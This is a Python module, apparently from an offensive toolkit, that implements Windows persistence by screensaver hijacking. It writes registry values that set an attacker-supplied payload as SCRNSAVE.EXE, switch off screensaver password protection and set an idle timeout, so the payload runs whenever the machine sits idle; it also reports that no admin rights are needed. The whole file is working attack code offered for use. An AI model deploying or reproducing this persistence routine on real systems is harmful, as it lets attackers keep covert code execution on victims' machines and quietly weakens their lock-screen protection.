"""
Screensaver hijacking persistence method
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.utils import run_command, validate_payload_path
from config import REGISTRY_PATHS, DEFAULT_SCREENSAVER_TIMEOUT


class ScreensaverPersistence:
    """Handles screensaver hijacking persistence"""
    
    def __init__(self):
        self.screensaver_path = REGISTRY_PATHS['screensaver']
    
    def install(self, payload_path, timeout=DEFAULT_SCREENSAVER_TIMEOUT):
        """
        Install persistence via screensaver hijack
        Executes when screensaver activates
        
        Args:
            payload_path (str): Path to payload
            timeout (int): Screensaver timeout in seconds
            
        Returns:
            dict: Installation result with removal command
        """
        print("[*] Installing Screensaver persistence...")
        
        # Validate payload
        is_valid, error = validate_payload_path(payload_path)
        if not is_valid:
            print(f"[-] Invalid payload: {error}")
            return None
        
        # Multiple registry values need to be set
        commands = [
            # Set our payload as the screensaver executable
            f'reg add "{self.screensaver_path}" /v SCRNSAVE.EXE /t REG_SZ /d "{payload_path}" /f',
            
            # Enable screensaver
            f'reg add "{self.screensaver_path}" /v ScreenSaveActive /t REG_SZ /d "1" /f',
            
            # Disable password protection (so it runs without user interaction)
            f'reg add "{self.screensaver_path}" /v ScreenSaverIsSecure /t REG_SZ /d "0" /f',
            
            # Set timeout
            f'reg add "{self.screensaver_path}" /v ScreenSaveTimeout /t REG_SZ /d "{timeout}" /f'
        ]
        
        print(f"[*] Configuring screensaver settings...")
        print(f"    Timeout: {timeout} seconds")
        print(f"    Password protection: Disabled")
        
        success = True
        failed_command = None
        
        for cmd in commands:
            result = run_command(cmd)
            if not result or not result['success']:
                success = False
                failed_command = cmd
                break
        
        if success:
            print(f"[+] Persistence installed successfully!")
            print(f"    Location: {self.screensaver_path}")
            print(f"    Screensaver: {payload_path}")
            print(f"    Timeout: {timeout} seconds ({timeout/60:.1f} minutes)")
            print(f"    Trigger: Screensaver activation (idle time)")
            print(f"    Admin Required: No")
            print(f"    Detection: Medium difficulty")
            print(f"\n[*] Payload will execute after {timeout} seconds of inactivity")
            
            return {
                'method': 'screensaver',
                'path': self.screensaver_path,
                'payload': payload_path,
                'timeout': timeout,
                'requires_admin': False,
                'remove_command': f'reg add "{self.screensaver_path}" /v ScreenSaveActive /t REG_SZ /d "0" /f'
            }
        else:
            print(f"[-] Failed to install persistence")
            print(f"    Failed command: {failed_command}")
            return None
    
    def get_current_screensaver(self):
        """
        Get current screensaver configuration
        
        Returns:
            dict: Current screensaver settings
        """
        query_cmd = f'reg query "{self.screensaver_path}"'
        result = run_command(query_cmd)
        
        if not result or not result['success']:
            return None
        
        settings = {
            'enabled': False,
            'executable': None,
            'timeout': None,
            'secure': False
        }
        
        output = result['stdout']
        
        # Parse output
        for line in output.split('\n'):
            if 'ScreenSaveActive' in line and 'REG_SZ' in line:
                value = line.split('REG_SZ')[-1].strip()
                settings['enabled'] = value == '1'
            elif 'SCRNSAVE.EXE' in line and 'REG_SZ' in line:
                settings['executable'] = line.split('REG_SZ')[-1].strip()
            elif 'ScreenSaveTimeout' in line and 'REG_SZ' in line:
                try:
                    settings['timeout'] = int(line.split('REG_SZ')[-1].strip())
                except ValueError:
                    pass
            elif 'ScreenSaverIsSecure' in line and 'REG_SZ' in line:
                value = line.split('REG_SZ')[-1].strip()
                settings['secure'] = value == '1'
        
        return settings
    
    def disable_screensaver(self):
        """
        Disable screensaver (cleanup)
        
        Returns:
            bool: Success status
        """
        print("[*] Disabling screensaver...")
        
        command = f'reg add "{self.screensaver_path}" /v ScreenSaveActive /t REG_SZ /d "0" /f'
        result = run_command(command)
        
        if result and result['success']:
            print("[+] Screensaver disabled")
            return True
        else:
            print("[-] Failed to disable screensaver")
            return False